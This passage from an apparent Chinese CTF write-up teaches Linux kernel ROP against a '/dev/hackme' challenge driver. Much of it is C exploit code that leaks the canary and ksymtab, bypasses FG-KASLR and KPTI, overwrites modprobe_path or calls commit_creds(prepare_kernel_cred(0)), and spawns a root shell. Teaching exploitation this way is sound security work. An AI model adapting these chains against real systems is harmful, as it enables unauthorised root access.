function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/hackme\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> length<span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    canary <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    vmlinux_base <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFFFFFFFFFF0000</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> canary<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Write data to modprobe_path</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rax_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x782f706d742f</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// tmp/x</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rbx_r12_r13_rbp_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> modprobe_path<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> write_rbx_rax_pop_rbx_rbp_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> kpti_trampoline<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>get_flag<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h4 id=\"常规rop\"><a class=\"markdownIt-Anchor\" href=\"#常规rop\">#</a> 常规 ROP</h4>\n<p>使用纯 ROP 方法最困难的地方就是找 gadget 了， 因为 FG-KASLR 打乱了几乎每个函数的地址，因此可以用到的 gadget 很少，但是 ksymtab 表不会变，我们可以泄露出 ksymtab 的内容来推出 commit_creds prepare_kernel_cred 的真实地址和 ，这样困难就变成了将 rax 转移到 rdi，所以只能将调用过程分解，分成两次来 ROP</p>\n<p>另外在找 gadget 的时候，这里的 5f 可以错出一个 pop rdi 出来，真滴神奇</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">ffffffff8100389f<span class=\"token operator\">:</span>\t<span class=\"token number\">41</span> <span class=\"token number\">5f</span>                \tpop    r15\nffffffff810038a1<span class=\"token operator\">:</span>\t<span class=\"token number\">5</span>d                   \tpop    rbp\nffffffff810038a2<span class=\"token operator\">:</span>\tc3                   \tret</code></pre>\n<p>所以 0x38a0 的 gadget 就是 pop rdi ;pop rbp; ret ，也可以直接用 0x4854，但没上一个这么干净</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">ffffffff81004854<span class=\"token operator\">:</span>\t<span class=\"token number\">5f</span>                   \tpop    rdi\nffffffff81004855<span class=\"token operator\">:</span>\t<span class=\"token number\">5</span>e                   \tpop    rsi\nffffffff81004856<span class=\"token operator\">:</span>\t<span class=\"token number\">5</span>a                   \tpop    rdx\nffffffff81004857<span class=\"token operator\">:</span>\t<span class=\"token number\">59</span>                   \tpop    rcx\nffffffff81004858<span class=\"token operator\">:</span>\t<span class=\"token number\">5</span>d                   \tpop    rbp\nffffffff81004859<span class=\"token operator\">:</span>\tc3                   \tret    </code></pre>\n<p>ksymtab 是这么个样子</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">kernel_symbol</span> <span class=\"token punctuation\">&#123;</span>\n\t  <span class=\"token keyword\">int</span> value_offset<span class=\"token punctuation\">;</span>\n\t  <span class=\"token keyword\">int</span> name_offset<span class=\"token punctuation\">;</span>\n\t  <span class=\"token keyword\">int</span> namespace_offset<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></code></pre>\n<p>可以拿到第一个 偏移，之后加上 __ksymtab_commit_creds 就可以得到真实地址了，因此通过 gadget 将数据写入 rax 之后在返回到用户态，就可以得到其真实地址了，对此，也有个神奇的 gadget</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">ffffffff81004aad<span class=\"token operator\">:</span>\t<span class=\"token number\">48</span> <span class=\"token number\">8</span>b <span class=\"token number\">40</span> <span class=\"token number\">10</span>          \tmov    rax<span class=\"token punctuation\">,</span>QWORD PTR <span class=\"token punctuation\">[</span>rax<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span>\nffffffff81004ab1<span class=\"token operator\">:</span>\t<span class=\"token number\">5</span>d                   \tpop    rbp\nffffffff81004ab2<span class=\"token operator\">:</span>\tc3                   \tret    </code></pre>\n<p>但是 ，直接在函数中调用 write 貌似会清掉 rax ，因此可以写一个分发器，每次返回到这个 分发器函数 ，另外 kpti_trampoline 还可以控制 rdi ，那就可以直接 case 了</p>\n<p>之后的 commit_creds (prepare_kernel_cred (0)) 也同样分为两次，首先第一次执行 prepare_kernel_cred (0) 得到结构体并保存，在第二次 ROP 的时候在用上即可</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/image-20221012175419841.png\" alt=\"image-20221012175419841\"></p>\n<h5 id=\"exp-5\"><a class=\"markdownIt-Anchor\" href=\"#exp-5\">#</a> exp</h5>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t __ksymtab_commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0xf87d90</span><span class=\"token punctuation\">;</span>\nsize_t __ksymtab_prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0xf8d4fc</span><span class=\"token punctuation\">;</span>\n\nsize_t swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">=</span> <span class=\"token number\">0x200f10</span><span class=\"token punctuation\">;</span>\nsize_t kpti_trampoline <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\nsize_t write_rax_rax_pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4aad</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdi_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x38a0</span><span class=\"token punctuation\">;</span>\nsize_t pop_rax_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4d11</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t canary <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t leak <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">control</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m%#lx\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span> size_t buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>len<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x%-4x -> 0x%lx\\n\"</span> <span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    __ksymtab_commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    __ksymtab_prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    kpti_trampoline <span class=\"token operator\">=</span> swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">+</span> <span class=\"token number\">22</span><span class=\"token punctuation\">;</span>\n\n    write_rax_rax_pop_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rdi_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rax_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"__ksymtab_commit_creds\"</span> <span class=\"token punctuation\">,</span> __ksymtab_commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"__ksymtab_prepare_kernel_cred\"</span> <span class=\"token punctuation\">,</span> __ksymtab_prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_addr</span><span class=\"token punctuation\">(</span>size_t to_leak <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> next<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> canary<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rax_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> to_leak <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> write_rax_rax_pop_rbp_ret <span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> kpti_trampoline<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> next<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>control<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Return ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">to_rop</span><span class=\"token punctuation\">(</span> size_t address <span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> next <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> canary<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_rbp_ret<span class=\"token punctuation\">;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> address<span class=\"token punctuation\">;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_rbp_ret<span class=\"token punctuation\">;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n        rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> kpti_trampoline<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> next<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>control<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token 